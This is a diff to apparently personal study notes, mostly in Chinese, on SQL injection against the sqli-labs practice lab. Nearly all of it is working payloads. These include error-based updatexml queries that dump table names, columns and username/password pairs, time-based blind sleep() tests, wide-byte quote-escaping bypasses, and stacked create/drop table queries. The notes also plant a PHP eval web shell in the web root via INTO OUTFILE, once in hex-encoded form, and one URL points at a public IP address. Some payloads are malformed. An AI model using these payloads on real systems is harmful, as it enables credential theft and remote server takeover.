@@ -76,7 +76,7 @@ if( length(database())>1, 1, sleep(5)    )
 updatexml(1, concat(0x7e, (select  (group_concat(table_name)) from  (information_schema.tables) where (table_schema = 0x7365637572697479)  ) ),1)
 
 updatexml(1, concat(0x7e, (select (group_concat(column_name)) from information_schema.columns where table_name = 0x7573657273  ) ),1)
-
+updatexml(1, concat(select group_concat(table_name) from information_schema.tables where table_schema=0x4348414c4c454e474553 )  ,1)
 updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,password))) from (security.users)  ) ),1)
 
 url = "http://121.199.30.46/Less-26/?id=1'" + code_0x + %26%26 + code_0x "'1'='1"
@@ -84,3 +84,135 @@ http://121.199.30.46/Less-26/?id=1' 空格 && 空格 '1'='1
 
 A or B  and D
 C  and D
+
+%aa%5c'
+%aa%5c%27
+%aa%5c%5c%5c%27
+%aa%5c %5c%5c%27
+猏 \\ '
+
+a%df'
+uname=a % df %5C %27
+
+create table crow like users; --+
+drop table crow ; --+ 
+
+a') ; create table crow like users; #
+a') ; drop table crow ; #
+
+a' ; create table crow3 like users; #
+a' ; drop table crow3 ; #
+
+1. root   写权限
+2. 一句话木马
+3. select xxx into outfile xxx
+4.   绝对路径
+
+<?php @eval($_POST['crow']);?>
+C:\\phpstudy\\PHPTutorial\\WWW
+
+pycharm   
+select '<?php @eval($_POST[crow]);?>' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\crow.php'; #
+
+
+SELECT * FROM users ORDER BY 2
+
+select * from users where id= 'xx' order by  xxx;
+
+
+1. 报错注入
+select updatexml( 1,  concat(0x7e, (database())  )   ,1)
+
+select updatexml( 1,  concat(0x7e, (schema_name from information_schema.schema_name limit 0,1)  )   ,1)
+
+
+2. 时间注入
+
+select if (  (length(database()) >1 )     ,1, sleep(5)   )
+
+
+?id=
+?sort=
+select * from users where id= xxx
+
+select * from users order by xxx
+less46-49 报错注入，时间盲注
+''
+
+select *** into outfile ''
+
+http://127.0.0.1/sqli/Less-49//?sort=3' into outfile "C:\\phpstudy\\PHPTutorial\\WWW\\less49.txt "  --+
+
+http://127.0.0.1/sqli/Less-49//?sort=3' and select '<?php @eval($_POST['crow']);?>' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\less49.php' --+
+
+lines terminated by  0xXXX
+http://127.0.0.1/sqli/Less-49//?sort=3' into outfile "C:\\phpstudy\\PHPTutorial\\WWW\\less49_02.php " lines terminated by 0x3c3f70687020406576616c28245f504f53545b2763726f77275d293b3f3e --+
+
+CHALLENGES
+4348414c4c454e474553
+
+updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x4348414c4c454e474553   )),1)
+mk25r38vwy
+updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='mk25r38vwy'   )),1)
+id,sessid,secret_OHW4,tryy
+updatexml(1,concat(0x7e,(select group_concat(secret_OHW4) from CHALLENGES.mk25r38vwy  )),1)
+
+left( (select table_name from information_schema.tables where table_schema='CHALLENGES' limit 0,1) ,1 ) > 'a'
+
+flag
+
+
+id = 
+''
+""
+()
+('')
+((""))
+((''))
+不加任何符号
+select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES';
+lbn4tcev6s
+select group_concat(column_name)  from information_schema.columns where table_name= 'lbn4tcev6s'
+secret_3W4Q
+select group_concat(concat_ws(0x7e, secret_3W4Q)) from CHALLENGES.lbn4tcev6s
+
+
+CHALLENGES
+select updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')  ),1)
+iaikcl216o
+
+select updatexml(1,concat(0x7e, (select group_concat(column_name)  from information_schema.columns where table_name= 'iaikcl216o')  ),1)
+
+secret_F5HN
+
+select updatexml(1,concat(0x7e, (select select group_concat(concat_ws(0x7e, secret_F5HN)) from CHALLENGES.iaikcl216o)  ),1)
+
+
+id = 1\'
+
+
+
+id 
+sort 
+'
+"
+()
+闭合 
+--+  --空格  # 
+报错注入
+布尔盲注
+基于时间的盲注
+读文件、写文件
+mysql + php
+
+入门
+waf
+id = 1 '
+mysql access mssql 
+
+sql 语法
+
+php
+
+
+
